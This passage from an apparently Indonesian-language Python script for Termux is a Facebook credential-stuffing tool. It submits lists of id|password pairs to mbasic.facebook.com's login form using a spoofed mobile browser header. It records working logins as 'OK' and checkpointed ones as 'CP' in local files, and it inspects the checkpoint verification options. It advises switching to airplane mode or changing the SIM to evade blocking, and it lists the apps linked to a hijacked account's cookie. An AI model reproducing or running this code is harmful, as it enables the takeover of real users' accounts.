                jo = ho.find('form')
                data = {}
                lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                for anj in jo('input'):
                        if anj.get('name') in lion:
                                data.update({anj.get('name'):anj.get('value')})
                kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
                opsi = kent.find_all('option')
                if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                else:
                        for opsii in opsi:
                                print('\r%s---> %s%s'%(kk,opsii.text,x))
        except Exception as c:
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
        c = len(akun)
        hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
        cetak(nel(hu, title='CEK OPSI'))
        input(x+'['+h+'•'+x+'] Mulai')
        cek = '# PROSES CEK OPSI DIMULAI'
        sol().print(mark(cek, style='green'))
        love = 0
        for kes in akun:
                try:
                        try:
                                id,pw = kes.split('|')[0],kes.split('|')[1]
                        except IndexError:
                                time.sleep(2)
                                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                                continue
                        bi = random.choice([u,k,kk,b,h,hh])
                        print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
                        #a = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'                        ses = requests.Session()
                        header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                        hi = ses.get('https://mbasic.facebook.com')
                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
                        if "checkpoint" in ses.cookies.get_dict().keys():
                                try:
                                        jo = ho.find('form')
                                        data = {}
                                        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                                        for anj in jo('input'):
                                                if anj.get('name') in lion:
                                                        data.update({anj.get('name'):anj.get('value')})
                                        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        opsi = kent.find_all('option')
                                        if len(opsi)==0:
                                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                                        else:
                                                for opsii in opsi:
                                                        print('\r%s---> %s%s'%(kk,opsii.text,x))
                                except:
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
                        elif "c_user" in ses.cookies.get_dict().keys():
                                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
                        else:
                                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
                        love+=1
                except requests.exceptions.ConnectionError:
                        print('')
                        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                        sol().print(mark(li, style='red'))
                        exit()
        dah = '# DONE'
        sol().print(mark(dah, style='green'))
        exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
        sop = BeautifulSoup(w,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        if len(game)==0:
                print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
        else:
                for i in range(len(game)):
                        print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
        sop = BeautifulSoup(w,"html.parser")
        x = sop.find("form",method="post")
        game = [i.text for i in x.find_all("h3")]
        if len(game)==0:
                print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
        else:
                for i in range(len(game)):
                        print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
        try:os.system('git pull')
        except:pass
        try:os.mkdir('OK')
        except:pass
        try:os.mkdir('CP')
        except:pass
        try:os.mkdir('/sdcard/BAZ-CIL')
        except:pass
        try:os.system('touch .prox.txt')
        except:pass
        try:os.system('clear')
        except:pass
        Basari(f'\n\t{x}{h}Hello, Welcome Termux Users ,Iam Baz,Have a good time{x}')
        time.sleep(3)
        login()
######### THANKS TO IQBAL FRIENDS ##########